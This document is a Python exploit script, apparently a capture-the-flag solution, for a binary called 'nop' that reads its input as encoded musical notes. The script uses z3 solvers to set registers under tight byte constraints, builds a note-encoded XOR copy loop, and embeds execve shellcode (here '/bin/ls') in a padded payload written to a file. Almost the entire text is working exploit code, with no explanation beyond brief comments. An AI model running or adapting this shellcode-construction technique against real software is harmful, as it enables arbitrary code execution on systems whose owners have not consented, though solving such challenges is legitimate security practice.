#from romanpwn import *
from pwn import *
from capstone import *
from z3 import *
import struct
import itertools

val_static = [0, 927150662, 927150660, 0, 927150658, 860042308, 944191811, 910570564, 893728833, 876752962, 0, 876688449, 1110451014, 876951111, 826552389, 960770117, 893858882, 0]

# 1178149703
# 1178149700
# 1177690945
# 1110451014
# 591870278 fanno casini (aaa)

vals = val_static + [
0x4f4f4f4f, # esp + 0x38
0x2d2d2d2d, # esp + 0x40
0x57202d2d, # esp + 0x42
0x6c655720, # esp + 0x44
0x636c6557, # esp + 0x45
0x6f636c65, # esp + 0x46
0x656d6f63, # esp + 0x48
0x20656d6f, # esp + 0x49
0x7420656d] # esp + 0x4a

offsets = {
    0x4f4f4f4f: 0,
    0x2d2d2d2d: 0x8,
    0x57202d2d: 0xa,
    0x6c655720: 0xc,
    0x636c6557: 0xd,
    0x6f636c65: 0xe,
    0x656d6f63: 0x10,
    0x20656d6f: 0x11,
    0x7420656d: 0x12
}

def set_eax(eax_val, tolerance=0xfff):
    # NB assumes edi was not changed!
    solver = Solver()
    l = []
    exp = None
    for i in range(len(vals)):
        temp = BitVec('b'+str(i), 32)
        l.append(temp)
        solver.add(Or(temp == 0, temp == 0xffffffff))
        if exp is not None:
            exp = exp ^ (vals[i] & temp)
        else:
            exp = (vals[i] * temp)

    solver.add(exp >= eax_val)
    solver.add(exp <= eax_val + tolerance)
    if solver.check() == unsat:
        print 'UNSAT'
    m = solver.model()

    res = 0
    for i in range(len(vals)):
        if not m[l[i]] == 0:
            # print(hex(vals[i]))
            res ^= vals[i]
    print "Address found:", hex(res)
    #assert res == eax_val 

    shellcode = []
    for i in range(18):
        if not m[l[i]] == 0:
            # NB increases esp
            temp = struct.pack('<L', vals[i])
            shellcode += ['D5', temp[:2], temp[2:]]

    incs = 0
    for i in range(18, 27):
        if not m[l[i]] == 0:
            while incs < offsets[vals[i]]:
                shellcode += ['G8', 'G0']  # inc edi
                incs += 1
            shellcode += ['B3', 'G8']

    return shellcode

#print set_eax(0x40404a4b)

def set_al(al_val, prev_value=0, position=0):
    bytelist = [178, 201, 245, 108, 132, 152, 174, 200, 223, 234, 252, 10, 21, 205, 226, 243, 56, 67, 121, 207, 238, 2, 18, 59, 156, 234, 102, 134, 149, 162, 182, 152, 191, 222, 246, 5, 22, 63, 94, 131, 139, 156, 209, 231, 26, 163, 202, 73, 111, 146, 163, 217, 235, 103, 130, 192, 222, 243, 16, 59, 68, 89, 108, 131, 158, 197, 14, 41, 61, 194, 227, 0, 32, 64, 33, 0, 16, 255]

    big_vals = {
        0x46: 0x37433246,
        0x44: 0x37433244,
        0x42: 0x37433242,
        0x43: 0x38473943,
        0x41: 0x35453841,
        0x47: 0x34453647,
        0x45: 0x31443045,
    }

    dvals = {65: ['D5', 'A8', 'E5'],
         66: ['D5', 'B2', 'C7'],
         67: ['D5', 'C9', 'G8'],
         68: ['D5', 'D2', 'C7'],
         69: ['D5', 'E0', 'D1'],
         70: ['D5', 'F2', 'C7'],
         71: ['D5', 'G6', 'E4'],     
        #0x40: ['B6', 'B2', 'E1'], # 0x31
        #0xe5: ['B6','B2', 'E2'],  # 0x32
        #0xf7: ['B6','B2', 'E3'],  # 0x33
        #0xff: ['B6','B2', 'E4'],  # 0x34
       # 0x69: ['B6','B2','E9']    # 0x39
    }
    vals = [x for x in dvals]

    ebpgadgets = [['G2', 'E' + str(i)] for i in (0, 4, 8)]
    incebp = ['E5', 'E4', 'C6', 'E5', 'E4', 'C6']

    steps = 0
    shellcode = []
    if position == 0:
        for _ in range(144 / 2):
            shellcode += incebp
        position = 144

    while position < (len(bytelist) * 4) + 144:
        available_bits = bytelist[(position-144)/4:(position-144)/4+3]
        #print(available_bits)
        tempvals = vals + available_bits
        #print(tempvals)
        solver = Solver()
        l = []
        exp = None
        for i in range(len(tempvals)):
            temp = BitVec('b'+str(i), 8)
            l.append(temp)
            solver.add(Or(temp == 0, temp == 0xff))
            if exp is not None:
                exp = exp ^ (tempvals[i] & temp)
            else:
                exp = (tempvals[i] & temp)

        solver.add(exp == (al_val ^ prev_value))
        solver.check()

        try:
            m = solver.model()

            for i in range(len(vals)):
                if not m[l[i]] == 0:
                    print('cons', hex(vals[i]))
                    # NB increases esp
                    shellcode += dvals[vals[i]]
            for i in range(len(tempvals) - len(vals)):
                if not m[l[len(vals) + i]] == 0:
                    print('mem', hex(available_bits[i]))
                    shellcode += ebpgadgets[i]

            print(steps)
            return shellcode, position

        except:
            #print("unsat")
            shellcode += incebp * 2
            position += 4
            steps += 1


    raise Exception("not solvable!")


binshaddr = 0x40404a4f

shellcode = asm(shellcraft.execve('/bin/ls', [''], []))

NOP = 'B7'    #inc edx; aaa ;
DNOP = 'G#7'    #inc edi; and esi, dword ptr [edi]; 

n_to_f = {'G#1': 101, 'G#0': 51, 'G#3': 404, 'G#2': 202, 'G#5': 1614, 'G#4': 807, 'G#7': 6456, 'G#6': 3228, 'G#9': 25823, 'G#8': 12912, 'G7': 6094, 'G6': 3047, 'G5': 1524, 'G4': 762, 'G3': 381, 'G2': 191, 'G1': 96, 'G0': 48, 'G9': 24374, 'G8': 12187, 'D#8': 9673, 'D#9': 19346, 'D#6': 2419, 'A8': 6840, 'B4': 480, 'B5': 960, 'B6': 1920, 'B7': 3839, 'B0': 30, 'B1': 60, 'B2': 120, 'B3': 240, 'B8': 7678, 'B9': 15355, 'F#0': 45, 'F#1': 90, 'F#2': 180, 'F#3': 360, 'F#4': 719, 'F#5': 1438, 'F#6': 2876, 'F#7': 5752, 'F#8': 11503, 'F#9': 23006, 'E9': 20496, 'E8': 10248, 'E5': 1281, 'E4': 641, 'E7': 5124, 'E6': 2562, 'E1': 81, 'E0': 41, 'E3': 321, 'E2': 161, 'A#3': 227, 'A#2': 114, 'A#1': 57, 'A#0': 29, 'A#7': 3624, 'A#6': 1812, 'A#5': 906, 'A#4': 453, 'A#9': 14493, 'A#8': 7247, 'C9': 16268, 'C8': 8134, 'C3': 255, 'C2': 128, 'C1': 64, 'C0': 32, 'C7': 4067, 'C6': 2034, 'C5': 1017, 'C4': 509, 'F0': 43, 'F1': 85, 'F2': 170, 'F3': 340, 'F4': 679, 'F5': 1358, 'F6': 2715, 'F7': 5429, 'F8': 10858, 'F9': 21715, 'A1': 54, 'A0': 27, 'A3': 214, 'A2': 107, 'A5': 855, 'A4': 428, 'A7': 3420, 'A6': 1710, 'A9': 13680, 'D#7': 4837, 'D#4': 605, 'D#5': 1210, 'D#2': 152, 'D#3': 303, 'D#0': 38, 'D#1': 76, 'C#9': 17235, 'C#8': 8618, 'C#5': 1078, 'C#4': 539, 'C#7': 4309, 'C#6': 2155, 'C#1': 68, 'C#0': 34, 'C#3': 270, 'C#2': 135, 'D8': 9130, 'D9': 18260, 'D6': 2283, 'D7': 4565, 'D4': 571, 'D5': 1142, 'D2': 143, 'D3': 286, 'D0': 36, 'D1': 72}

def encoder(note):
    r = ""
    i = 0
    while i < len(note):
        #print note[i:i+2]
        if i+2 <= len(note) and note[i:i+2] in n_to_f:
            r += p16(n_to_f[note[i:i+2]])
            i += 2
        elif i+3 <= len(note) and note[i:i+3] in n_to_f:
            r += p16(n_to_f[note[i:i+3]])
            i += 3
        else: raise RuntimeError(str(i))
    return r

MASK1 = 0x40404800
MASK2 = 0x60606800

payload = ""

SETEAX = set_eax(0x40404a4b, 0x0)
md = Cs(CS_ARCH_X86, CS_MODE_32)
baseaddr = 0x60606000

def disasm(code, address):
    instructions = ''
    regex = r'ptr \[e[bcd]x'
    size = 0
    for i in md.disasm(code, address):
        size += i.size
        instructions += '%s %s; ' % (i.mnemonic, i.op_str)
        if re.findall(regex, i.op_str):
            return None

    if size != len(code):
        return None

    return instructions


# SET_EAX = ['D5', 'G6', 'E4', 'D5', 'E0', 'D1', 'B3', 'G8', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'G8', 'G0', 'B3', 'G8', 'G8', 'G0', 'G8', 'G0', 'B3', 'G8']
#set eax to 0x40404a4b (== &mask1)
payload += encoder("".join(SETEAX))


payload += encoder('C#8')   #inc ebx; and edi, dword ptr [eax]; eax must point to mask1 0x4040404xxx
payload += encoder('C#7')   #inc ebx; and esi, dword ptr [edi];

# copy primitive assume we're writing to space memset to \x00

COPY = ""
# store the current value of al so we can xor back
COPY += encoder('B0F1')     #inc edx; xor byte ptr [esi + 0x31], al;
COPY += encoder('B2F4')     #inc edx; xor al, byte ptr [esi + 0x34];  next note-nop after three bytes use it to xor happily
# NOP is 2 bytes, we can use this to xor out stuff
COPY += encoder('G2G8')     #inc edi; xor al, byte ptr [edi + 0x38];
COPY += encoder('B0F1')     #inc edx; xor byte ptr [esi + 0x31], al;
COPY += encoder('F7')       #inc esi; aaa;

"""
write must be aligned to "NOTE-NOP" opcodes, we can use a different version of this 
depending on "nop" alignment :)
COPY += encoder('B0F0')     #inc edx; xor byte ptr [esi + 0x30], al;
COPY += encoder('B2F2')     #inc edx; xor al, byte ptr [esi + 0x32];
# NOP is 2 bytes, we can use this to xor out stuff
COPY += encoder('G2G8')     #inc edi; xor al, byte ptr [edi + 0x38];
COPY += encoder('B0F0')     #inc edx; xor byte ptr [esi + 0x30], al;
COPY += encoder('F7')       #inc esi; aaa;
"""

for _ in xrange(len(shellcode)):
    payload += COPY

mask_delta = (0x800 - len(payload) - 2)
n_nops = (mask_delta / 2 )             # a single note is encoded in a word
NOPS = encoder(DNOP) * n_nops
payload += NOPS

payload += "\xff\xff"
# payload += encoder('G3G2')           #inc edi; xor eax, dword ptr [edi + 0x30];

print hex(len(payload))
# mask to let us use \x00 (add    BYTE PTR [eax],al) as nop
payload += 'a' * (0x800 - len(payload))
assert len(payload) == 0x800
payload += p32(MASK2)
payload += 'b' * (0x838 - len(payload))
payload += 'c' + shellcode
payload += 'd' * (0xa4b - len(payload))
payload += p32(MASK1)

payload += '\x00\x00'

#print SETEAX
#print '\n'.join(disasm(''.join(SETEAX), baseaddr).split(';'))

with open('payload','w') as f:
    f.write(payload)

"""
p = process('./nop')
p.sendline(payload)
p.readline()
p.readline()
if r:
    print 'WOOOOOOOOOO %s' % r
"""
